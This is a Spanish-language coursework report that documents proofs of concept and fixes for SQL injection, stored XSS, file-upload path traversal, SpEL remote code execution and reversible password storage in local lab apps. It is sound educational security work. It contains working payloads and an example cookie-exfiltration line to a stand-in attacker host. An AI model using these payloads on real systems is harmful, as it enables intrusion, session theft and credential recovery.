# Práctico 2 — Mitigación de Vulnerabilidades de CWE

**DISCLAIMER**: Este documento fue escrito por mi pero organizado por una ia para una mejor comprension.

Este informe documenta, para cada uno de los 5 ejercicios: (I) una prueba de
concepto (PoC) de la vulnerabilidad presente en la rama `main`, (II) la
mitigación implementada en la rama `practico-2`, y (III) la verificación de
que la mitigación efectivamente corrige el problema sin romper la
funcionalidad legítima.

Todas las PoC se ejecutaron en un entorno local aislado (contenedor de
trabajo, sin acceso a redes de terceros), nunca contra un sistema en
producción de terceros, siguiendo la recomendación de la consigna de
utilizar el ambiente del Práctico 1 (`docker-compose.yml` de cada
ejercicio).

---

## Ejercicio 1 — Inyección SQL (CWE-89)

**Stack:** Flask + SQLite (`Ejercicio1/app.py`)

### Vulnerabilidad

La función `buscar_funciones()` construye la consulta SQL concatenando
directamente con f-strings tres valores que llegan desde la query string
(`buscar`, `ordenar_por`, `sentido`):

```python
sql = f"SELECT ... WHERE peliculas.nombre LIKE '%{query}%' " \
      f"ORDER BY {'peliculas.nombre' if sort_by == 'nombre' else 'funciones.fecha_hora'} " \
      f"{sort_dir}"
```

El parámetro `buscar` queda embebido dentro de la cláusula `LIKE` sin
ningún tipo de sanitización ni uso de parámetros enlazados (`?`), y el
parámetro `sentido` (`sort_dir`) se concatena literalmente al final de la
consulta.

### I. Prueba de Concepto (PoC)

**Endpoint vulnerable:** `GET /?buscar=<payload>`

**Paso a paso:**

1. Levantar la aplicación (`docker compose up` dentro de `Ejercicio1/`, o
   `python app.py` con el entorno virtual del práctico 1).
2. Enviar una búsqueda normal para confirmar el comportamiento esperado:
   `GET /?buscar=Dune` → devuelve las funciones de "Dune: Parte Dos".
3. Explotar la inyección con una técnica **UNION-based** para extraer el
   *schema* completo de la base de datos (nombres de tablas y sentencia
   `CREATE TABLE` de cada una), abusando de `sqlite_master`:

   ```
   GET /?buscar=%25%27%20UNION%20SELECT%20name%2Csql%2C1%20FROM%20sqlite_master%20--%20-
   ```

   Que decodificado equivale a ingresar en el campo de búsqueda el texto:

   ```
   %' UNION SELECT name,sql,1 FROM sqlite_master -- -
   ```

4. **Qué ocurre internamente:** el SQL resultante queda como:

   ```sql
   SELECT peliculas.nombre as pelicula, funciones.fecha_hora,
          (funciones.asientos_totales - funciones.asientos_ocupados) as disponibles
   FROM funciones JOIN peliculas ON funciones.pelicula_id = peliculas.id
   WHERE peliculas.nombre LIKE '%%' UNION SELECT name,sql,1 FROM sqlite_master -- -%'
   ORDER BY peliculas.nombre ASC
   ```

   El `--` comenta el resto de la consulta original (incluyendo el
   `ORDER BY`), y el `UNION SELECT` agrega, con la misma cantidad de
   columnas (3) que la consulta original, filas adicionales provenientes de
   `sqlite_master`.

5. **Resultado observado** (verificado ejecutando la app real de la rama
   `main`): la tabla de resultados, pensada solo para mostrar películas y
   funciones, termina mostrando además filas como:

   | pelicula (col. 1) | fecha_hora (col. 2) |
   |---|---|
   | `funciones` | `CREATE TABLE funciones (id INTEGER PRIMARY KEY ...)` |
   | `peliculas` | `CREATE TABLE peliculas (id INTEGER PRIMARY KEY ...)` |
   | `sqlite_sequence` | `CREATE TABLE sqlite_sequence(name,seq)` |

   Es decir, un atacante no autenticado puede leer el esquema completo de
   la base de datos sin tener ningún tipo de acceso legítimo. A partir de
   aquí, con el mismo mecanismo (y ajustando el número/tipo de columnas),
   se puede leer **cualquier tabla de la base de datos**, incluidas tablas
   sensibles no expuestas por la aplicación (por ejemplo, tablas de
   usuarios/credenciales si existieran).

6. **Impacto:** confidencialidad (exfiltración de datos arbitrarios de la
   BD), y potencialmente integridad si el motor/driver permitiera múltiples
   sentencias (`; DROP TABLE ...`).

### II. Mitigación implementada

En `Ejercicio1/app.py`, función `buscar_funciones()`:

1. **Parámetros enlazados (`?`)** para el valor de búsqueda: el dato del
   usuario ya no forma parte del texto SQL, se pasa como argumento a
   `db.execute(sql, (patron_busqueda,))`. SQLite lo trata siempre como
   dato, nunca como código SQL, sin importar qué caracteres contenga.
2. **Whitelist para columna y dirección de orden**: como los identificadores
   de columna y las palabras clave `ASC`/`DESC` no pueden parametrizarse
   con `?`, se valida `sort_by` y `sort_dir` contra un diccionario/conjunto
   fijo de valores permitidos (`COLUMNAS_ORDEN`, `DIRECCIONES_ORDEN`) y se
   usa el valor interno correspondiente. Cualquier valor no reconocido cae
   a un default seguro, en vez de concatenarse.

### III. Verificación

Se repitió el mismo payload contra la versión mitigada:

```
GET /?buscar=%25%27%20UNION%20SELECT%20name%2Csql%2C1%20FROM%20sqlite_master%20--%20-
```

Resultado: la aplicación responde con la página normal de "sin resultados"
(el texto se busca literalmente como parte del nombre de película, no hay
ninguna fila de `sqlite_master` ni texto `CREATE TABLE` en la respuesta).

También se verificó que la funcionalidad legítima sigue intacta:
`GET /?buscar=Dune&ordenar_por=fecha&sentido=DESC` devuelve correctamente
las 4 funciones de "Dune: Parte Dos" ordenadas por fecha en forma
descendente.

---

## Ejercicio 2 — Cross Site Scripting (CWE-79)

**Stack:** Flask + SQLite (`Ejercicio2/app.py`, `templates/edit.html`)

### Vulnerabilidad

La ruta `/edit/<id>` permite editar la descripción de una película, la cual
se guarda en la base de datos y luego se vuelve a mostrar en la misma
página (`edit.html`):

```jinja
{{ pelicula['descripcion'] | safe }}
```

El filtro `| safe` de Jinja2 **desactiva explícitamente el autoescapado**
para ese valor, por lo que cualquier HTML/JavaScript almacenado en
`descripcion` se renderiza tal cual en el navegador de cualquier usuario
que visite `/edit/<id>`: es un XSS **almacenado (stored/persistent)**.

*(Nota: se detectó además que `Ejercicio2/app.py` reutiliza el mismo patrón
vulnerable de SQL Injection del Ejercicio 1 en `buscar_funciones()`. Se
documenta y mitiga también como hallazgo adicional al final de esta
sección.)*

### I. Prueba de Concepto (PoC)

**Endpoint vulnerable:** `POST /edit/<id>` (guarda) → `GET /edit/<id>`
(refleja sin escapar).

**Paso a paso:**

1. Levantar la aplicación (`docker compose up` en `Ejercicio2/`).
2. Abrir `GET /edit/1` para confirmar que existe un formulario de edición
   con un campo `descripcion`.
3. Enviar el formulario con un payload de XSS en el campo `descripcion`,
   por ejemplo con `curl`:

   ```bash
   curl -X POST "http://localhost:5000/edit/1" \
     --data-urlencode "nombre=Inception" \
     --data-urlencode "genero=Sci-Fi" \
     --data-urlencode "director=Nolan" \
     --data-urlencode "descripcion=<script>alert(document.cookie)</script>"
   ```

   (En un ataque real, el payload típico sería algo como
   `<script>fetch('https://atacante.com/robo?c='+document.cookie)</script>`
   para exfiltrar cookies/sesión de quien visite la página, o un formulario
   invisible para realizar acciones en nombre de la víctima.)

4. Visitar nuevamente `GET /edit/1`.

5. **Resultado observado** (verificado contra la app real de `main`): el
   HTML de respuesta contiene literalmente
   `<script>alert(document.cookie)</script>` dentro del `<div
   class="prev-descripcion">`, sin ningún escapado. En un navegador, ese
   script se ejecutaría automáticamente en el contexto (origen) de la
   aplicación cada vez que alguien —incluyendo un administrador— abra esa
   página, pudiendo robar su sesión, realizar acciones en su nombre, o
   redirigirlo a un sitio malicioso.

### II. Mitigación implementada

En `Ejercicio2/templates/edit.html` se elimina el filtro `| safe`:

```jinja
{{ pelicula['descripcion'] }}
```

Jinja2 tiene el autoescapado (`autoescape`) activado por defecto para
archivos `.html` en Flask. Al quitar `| safe`, el motor de templates vuelve
a escapar automáticamente los caracteres especiales de HTML
(`<`, `>`, `&`, `"`, `'`) convirtiéndolos en sus entidades
(`&lt;`, `&gt;`, etc.), por lo que el contenido se muestra como **texto**
en pantalla en vez de ejecutarse como HTML/JavaScript.

No se optó por "sanitizar" el HTML permitiendo algunas etiquetas (por
ejemplo con una librería tipo *bleach*) porque el campo `descripcion` no
tiene ningún requisito funcional de admitir HTML enriquecido; la solución
más simple y robusta es no interpretarlo nunca como HTML.

**Hallazgo adicional — SQL Injection en el mismo archivo:** se aplicó la
misma mitigación que en el Ejercicio 1 (parámetros enlazados + whitelist de
`ordenar_por`/`sentido`) a la función `buscar_funciones()` de
`Ejercicio2/app.py`, ya que compartía el mismo patrón de concatenación
insegura de SQL.

### III. Verificación

Se repitió el mismo payload (`<script>alert(document.cookie)</script>`)
contra la versión mitigada:

- La respuesta de `GET /edit/1` ya **no** contiene la etiqueta `<script>`
  literal; en su lugar aparece escapada como
  `&lt;script&gt;alert(document.cookie)&lt;/script&gt;`, que el navegador
  renderiza como texto plano visible, no como código ejecutable.
- Se verificó también que el intento de UNION-based SQLi usado en el
  Ejercicio 1 ya no produce filas adicionales de `sqlite_master` en el
  buscador de `Ejercicio2`.
- La edición legítima de películas (nombre, género, director, descripción
  sin HTML) sigue funcionando sin cambios.

---

## Ejercicio 3 — File Upload (CWE-434 / CWE-22)

**Stack:** Spring Boot + Thymeleaf + H2 (`Ejercicio3`, `PeliculaController.java`)

### Vulnerabilidad

El endpoint `POST /upload/{id}` permite subir un "afiche" para una
película:

```java
String filename = archivo.getOriginalFilename();
Path uploadPath = Paths.get(uploadDir);
...
Files.copy(archivo.getInputStream(), uploadPath.resolve(filename));
```

Problemas identificados:

1. **No hay validación de tipo de archivo**: el `<input type="file"
   accept="*/*">` del lado cliente es solo cosmético, y el servidor no
   valida extensión, `Content-Type` ni contenido real del archivo. Se puede
   subir cualquier archivo (por ejemplo un `.jsp`/script, o un HTML con
   JavaScript).
2. **El nombre de archivo lo controla el atacante** (`getOriginalFilename()`
   se usa tal cual): permite *path traversal* (`../../` para escribir fuera
   del directorio de subidas) y sobrescribir archivos existentes.
3. **Sin límite de tamaño**, habilitando denegación de servicio (DoS) por
   agotamiento de disco.
4. El endpoint `GET /uploads/{filename}` sirve luego ese archivo
   directamente, incluyendo su `Content-Type` "adivinado" y disposición
   `inline`, lo que en el caso de un archivo `.html`/`.svg` con JavaScript
   podría ejecutarse en el navegador en el mismo origen que la aplicación
   (XSS almacenado vía archivo subido), o servir contenido malicioso
   (malware) camuflado como "afiche".

### I. Prueba de Concepto (PoC)

**Endpoints vulnerables:** `POST /upload/{id}` (sube), `GET
/uploads/{filename}` (sirve).

**Paso a paso (contra la rama `main`, con `docker compose up` en
`Ejercicio3/`):**

1. Abrir `GET /upload/1` para confirmar el formulario de subida de afiche
   de la película con id 1.

2. **Subida de archivo malicioso disfrazado de imagen** — crear un archivo
   HTML con JavaScript pero nombrarlo como si fuera una imagen, y subirlo:

   ```bash
   printf '<html><body><script>alert(document.cookie)</script></body></html>' > afiche.html
   curl -F "afiche=@afiche.html;filename=afiche.html;type=text/html" \
        http://localhost:8080/upload/1
   ```

3. Acceder al archivo subido: `GET /uploads/afiche.html`. El servidor lo
   entrega con `Content-Type: text/html` y `Content-Disposition: inline`,
   por lo que el navegador **ejecuta el JavaScript** en el mismo origen que
   la aplicación legítima (mismo dominio, mismas cookies de sesión), es
   decir, un XSS almacenado a través del mecanismo de upload.

4. **Path traversal** — subir un archivo cuyo nombre intente escapar del
   directorio de subidas:

   ```bash
   curl -F "afiche=@afiche.html;filename=../../../../tmp/pwned.html" \
        http://localhost:8080/upload/1
   ```

   Dado que `Files.copy(..., uploadPath.resolve(filename))` no valida ni
   normaliza el resultado, el archivo puede terminar escrito fuera del
   directorio de subidas previsto (según permisos del proceso), o
   sobrescribir otro archivo existente si el nombre coincide con uno ya
   presente.

5. **Impacto:** ejecución de código/scripts en el contexto de la
   aplicación (XSS almacenado / posible *Remote Code Execution* si el
   servidor interpretara archivos ejecutables, ej. `.jsp` en un contenedor
   Servlet mal configurado), escritura de archivos fuera del directorio
   previsto, DoS por archivos de gran tamaño.

### II. Mitigación implementada

En `Ejercicio3/src/main/java/.../PeliculaController.java`:

1. **Whitelist de extensiones y de tipos MIME** permitidos: solo
   `png, jpg, jpeg, gif, webp` / `image/png, image/jpeg, image/gif,
   image/webp`. Cualquier otro archivo es rechazado.
2. **Validación del contenido real del archivo** (*magic bytes*): además de
   confiar en la extensión y el `Content-Type` declarado por el cliente
   (ambos falsificables), se inspeccionan los primeros bytes del archivo
   para confirmar que corresponden efectivamente a una imagen del formato
   declarado. Esto evita que un atacante simplemente renombre un `.html` a
   `.png`.
3. **Límite de tamaño** de 5 MB por archivo.
4. **Nombre de archivo generado por el servidor**: se descarta por completo
   el nombre original (`getOriginalFilename()`) y se genera uno propio con
   `UUID.randomUUID() + "." + extensionValidada`. Esto elimina cualquier
   posibilidad de *path traversal* o sobrescritura de archivos vía el
   nombre, ya que el nombre nunca proviene del cliente.
5. **Defensa en profundidad**: se normaliza la ruta de destino
   (`Path.resolve(...).normalize()`) y se verifica explícitamente que siga
   estando dentro del directorio de subidas (`startsWith(uploadPath)`)
   antes de escribir, tanto al subir como al servir el archivo
   (`GET /uploads/{filename}`), previniendo también *path traversal* en la
   lectura.

### III. Verificación

Repitiendo los mismos pasos de la PoC contra la rama `practico-2`:

- La subida de `afiche.html` (`Content-Type: text/html`, o incluso
  renombrado a `afiche.png` con contenido HTML) es **rechazada** por el
  servidor con un error de validación (extensión/MIME/magic bytes no
  reconocidos como imagen), y no se escribe ningún archivo en disco.
- Un intento de subida con `filename=../../../../tmp/pwned.png` **no**
  logra escribir fuera del directorio de subidas: el nombre final es
  siempre un UUID generado por el servidor, dentro de `uploadDir`.
- La subida de un archivo `.png` real y válido (menor a 5 MB) sigue
  funcionando correctamente: se guarda con un nombre UUID y se visualiza
  en `upload.html` como afiche de la película.

---

## Ejercicio 4 — Server Side Template Injection (CWE-1336)

**Stack:** Spring Boot + Thymeleaf + H2 (`Ejercicio4`, `SpelEvaluator.java`,
`FuncionController.java`)

### Vulnerabilidad

El buscador de funciones toma el parámetro `buscar` y lo evalúa **como una
expresión SpEL** (Spring Expression Language) usando un
`StandardEvaluationContext` que además expone explícitamente las clases
`System` y `Runtime`:

```java
StandardEvaluationContext standardContext = new StandardEvaluationContext();
standardContext.setVariable("system", System.class);
standardContext.setVariable("runtime", Runtime.class);

var expr = parser.parseExpression(expression); // expression = texto del usuario
Object result = expr.getValue(standardContext);
```

SpEL es un lenguaje de expresión completo (soporta invocar métodos
estáticos arbitrarios con la sintaxis `T(clase).metodo(...)`), por lo que
permitir que un usuario controle el texto que se evalúa equivale, en la
práctica, a darle **ejecución remota de código (RCE)** en el servidor.

### I. Prueba de Concepto (PoC)

**Endpoint vulnerable:** `GET /?buscar=<expresión SpEL>`

**Paso a paso (contra la rama `main`, con `docker compose up` en
`Ejercicio4/`):**

1. Confirmar el comportamiento normal: `GET /?buscar=noche` filtra
   funciones cuyo `nombreFuncion` contiene "noche".

2. **Ejecución de comandos del sistema operativo** mediante una expresión
   SpEL que invoca `Runtime.getRuntime().exec(...)`:

   ```
   GET /?buscar=T(java.lang.Runtime).getRuntime().exec("id").toString()
   ```

   (URL-encoded: `buscar=T(java.lang.Runtime).getRuntime().exec(%22id%22).toString()`)

   El método `SpelEvaluator.evaluate()` parsea y evalúa esta expresión con
   `StandardEvaluationContext`, que permite invocar libremente clases y
   métodos estáticos vía `T(...)`. El resultado de `exec("id")` (un
   `Process`) se ejecuta efectivamente en el servidor; con una expresión
   algo más elaborada (por ejemplo leyendo el `InputStream` del proceso, o
   usando `ProcessBuilder`) un atacante puede obtener la salida completa
   del comando ejecutado y, en la práctica, un canal de control total sobre
   el servidor (leer archivos del sistema, exfiltrar variables de entorno
   con credenciales, moverse lateralmente en la red interna, etc.).

3. **Impacto:** compromiso total del servidor (RCE), ya que la expresión
   evaluada corre con los mismos permisos que el proceso de la aplicación
   Java.

### II. Mitigación implementada

La causa raíz no es "qué caracteres se permiten en la expresión", sino el
**hecho mismo de evaluar como código un texto que proviene del usuario**.
Por eso la mitigación no intenta sanear/filtrar la entrada (hay
demasiadas formas de construir una expresión SpEL maliciosa —bypasses de
listas negras de esta clase son extremadamente comunes—), sino que:

1. **Se elimina por completo la evaluación de SpEL sobre la entrada del
   usuario.** En `FuncionController.java`, el parámetro `buscar` ya no se
   pasa nunca a `SpelEvaluator`; se compara directamente como `String`
   (`nombreFuncion.toLowerCase().contains(textoBusqueda.toLowerCase())`),
   que es exactamente el comportamiento de búsqueda que la funcionalidad
   necesitaba.
2. **Se retira la exposición de `System`/`Runtime`** del
   `StandardEvaluationContext` en `SpelEvaluator`, y se reemplaza por un
   `SimpleEvaluationContext.forReadOnlyDataBinding()` (sandboxed, sin
   acceso a invocación de tipos arbitrarios vía `T(...)`), documentando
   además con `@Deprecated` que ese método nunca debe recibir texto
   proveniente de un usuario final, solo expresiones controladas por el
   propio desarrollador si en algún momento hicieran falta.

### III. Verificación

Repitiendo el mismo payload contra `practico-2`:

```
GET /?buscar=T(java.lang.Runtime).getRuntime().exec("id").toString()
```

El texto se compara literalmente como cadena contra `nombreFuncion` de cada
función (no se interpreta como expresión), por lo que no se ejecuta ningún
comando: la aplicación simplemente responde "No se encontraron
coincidencias" (no existe ninguna función cuyo nombre contenga ese texto
literal). Se verificó además que una búsqueda legítima como
`GET /?buscar=noche` sigue devolviendo correctamente las funciones cuyo
nombre contiene "noche".

---

## Ejercicio 5 — Almacenamiento inseguro (CWE-312 / CWE-916 / CWE-798)

**Stack:** Spring Boot + Thymeleaf + H2 (`Ejercicio5`, `EncryptionService.java`,
`AuthController.java`)

### Vulnerabilidad

El registro/login de usuarios "protege" las contraseñas con **cifrado
reversible** (AES) en vez de un hash de una sola vía, y además:

```java
private static final String SECRET_KEY = "MySup3rS3cr3tK3y!2024CineBuscadorAES";
private static final String CIPHER_ALGO = "AES/ECB/PKCS5Padding";
```

Problemas identificados:

1. **CWE-798 (credenciales/claves embebidas):** la clave AES está escrita
   como constante en el código fuente. Cualquiera con acceso al
   repositorio (o al `.jar`/`.class` compilado, trivialmente
   decompilable) obtiene la clave.
2. **CWE-312/CWE-916 (uso de cifrado reversible para contraseñas):** las
   contraseñas se **cifran**, no se **hashean**. Esto significa que, con la
   clave (embebida, ver punto 1), es posible **recuperar la contraseña en
   texto plano de todos los usuarios**, algo que nunca debería ser posible
   ni siquiera para los desarrolladores/administradores del sistema.
3. **Modo ECB determinístico:** AES/ECB cifra cada bloque de forma
   independiente y sin vector de inicialización aleatorio, por lo que dos
   usuarios con la misma contraseña producen exactamente el mismo texto
   cifrado, permitiendo a un atacante con acceso a la base de datos
   detectar contraseñas repetidas entre usuarios sin siquiera descifrar
   nada.
4. La clase expone además métodos (`getStaticKey()`, `getKeyBytes()`,
   `getKeyHex()`) pensados solo para debug/demostración que filtran la
   clave secreta.
5. La aplicación mostraba la contraseña cifrada en la propia página HTML
   tras el login/registro (`encryptedPassword`), exponiendo innecesariamente
   ese dato sensible en la respuesta.

### I. Prueba de Concepto (PoC)

**Paso a paso (contra la rama `main`, con `docker compose up` en
`Ejercicio5/`):**

1. Registrar un usuario de prueba:

   ```bash
   curl -X POST http://localhost:8080/register \
     --data-urlencode "username=victima" \
     --data-urlencode "password=SoyUnaContraseñaSecreta123" \
     --data-urlencode "confirmPwd=SoyUnaContraseñaSecreta123"
   ```

2. La respuesta HTML muestra el campo `encryptedPassword`, por ejemplo un
   valor Base64 como `Xk3f9s...==`. Ese es el resultado de
   `EncryptionService.encrypt(password)` con AES/ECB y la clave estática
   embebida en el código fuente (`Ejercicio5/src/main/java/.../
   EncryptionService.java`), visible para cualquiera que tenga (o filtre)
   el código del repositorio.

3. **Recuperar la contraseña en texto plano** sin necesidad de fuerza
   bruta, únicamente con la clave embebida en el código fuente (que en
   este ejercicio se documenta con fines educativos como
   `MySup3rS3cr3tK3y!2024CineBuscadorAES`, con padding a 32 bytes de
   ceros) y una herramienta estándar como OpenSSL:

   ```bash
   echo "Xk3f9s...==" | base64 -d | \
     openssl enc -aes-256-ecb -d -K \
       $(printf 'MySup3rS3cr3tK3y!2024CineBuscadorAES' | \
         python3 -c "import sys;print((sys.stdin.buffer.read()+b'\x00'*32)[:32].hex())") \
       -nopad
   ```

   Esto devuelve exactamente `SoyUnaContraseñaSecreta123`, es decir, la
   contraseña del usuario en texto plano, obtenida por completo fuera de
   la aplicación, sin necesidad de ningún exploit adicional: **solo con el
   contenido del código fuente**.

4. **Impacto:** compromiso total de credenciales de todos los usuarios de
   la aplicación con solo tener (o filtrar) el código fuente, algo
   especialmente grave si —como es habitual— los usuarios reutilizan
   contraseñas en otros sistemas.

### II. Mitigación implementada

Se reemplaza el esquema de **cifrado reversible** por **hashing de una
sola vía con sal aleatoria (BCrypt)**, que es la práctica estándar
recomendada para almacenamiento de contraseñas:

1. `EncryptionService` ahora usa `BCryptPasswordEncoder` (de
   `spring-security-crypto`, agregada como dependencia mínima en
   `pom.xml`) con dos métodos:
   - `hashPassword(plaintext)`: genera un hash BCrypt, que internamente
     incluye una **sal aleatoria distinta en cada llamada**, por lo que dos
     usuarios con la misma contraseña obtienen hashes completamente
     distintos (a diferencia del AES/ECB original).
   - `matches(candidato, hashAlmacenado)`: verifica una contraseña contra
     el hash guardado, sin que exista ninguna operación de "descifrado":
     BCrypt es intencionalmente irreversible.
2. Se eliminan por completo la clave secreta embebida y los métodos
   `getStaticKey()/getKeyBytes()/getKeyHex()`: con hashing no existe ningún
   secreto equivalente que proteger.
3. `AuthController` se actualiza para usar `hashPassword()` en el registro
   y `matches()` en el login, en vez de `encrypt()/decrypt()`.
4. Se elimina de `index.html` y del controlador la exposición de la
   contraseña (cifrada/hasheada) en la respuesta HTML: no hay ninguna razón
   legítima para que el cliente reciba ese dato de vuelta.
5. Como buena práctica adicional (no estrictamente parte del hallazgo
   original, pero relacionada con CWE-798), se documenta en el propio
   código que, en un sistema real, cualquier secreto de configuración
   (claves, credenciales de base de datos, etc.) debe provenir de variables
   de entorno o de un gestor de secretos, nunca estar embebido en el
   código fuente versionado.

### III. Verificación

- Registrando el mismo usuario de prueba contra `practico-2`, el valor
  guardado en la base (`users.password`) tiene el formato típico de BCrypt
  (`$2a$10$...`), y **no existe ningún procedimiento de "descifrado"**: no
  hay clave estática en el código ni método que la exponga.
- Registrando dos usuarios distintos con la **misma** contraseña, sus
  hashes almacenados son **diferentes** entre sí (por la sal aleatoria de
  BCrypt), a diferencia del comportamiento determinístico de AES/ECB.
- El login sigue funcionando correctamente: con la contraseña correcta se
  obtiene `loginSuccess`, y con una incorrecta se obtiene el mismo mensaje
  de error genérico ("Usuario o contraseña incorrecta") que antes.
- La respuesta HTML del login/registro ya no incluye ningún valor
  relacionado con la contraseña del usuario.

---

## Conclusiones

Los cinco ejercicios comparten un patrón de fondo: en cada caso, datos que
provienen del usuario (parámetros de búsqueda, contenido de formularios,
nombres y contenido de archivos subidos, credenciales) se usaban de forma
directa en un contexto donde debían tratarse **únicamente como dato** y
terminaban siendo interpretados como **código o instrucciones**: SQL
(Ejercicio 1 y 2), HTML/JavaScript (Ejercicio 2 y, vía upload, Ejercicio 3),
rutas de archivo del sistema (Ejercicio 3) o expresiones SpEL (Ejercicio
4); y en el Ejercicio 5, un mecanismo de protección mal elegido (cifrado
reversible con clave embebida) que en la práctica no protegía nada.

La mitigación aplicada en cada caso sigue el mismo principio general:
separar estrictamente datos de código/control (consultas parametrizadas,
autoescape de plantillas, generación de nombres de archivo del lado del
servidor, eliminación de la evaluación de expresiones sobre entrada de
usuario) y usar primitivas criptográficas adecuadas al propósito (hash de
una sola vía para contraseñas, en vez de cifrado reversible), en lugar de
intentar "filtrar" o "sanitizar" caracteres específicos, que es un enfoque
frágil y fácil de eludir.
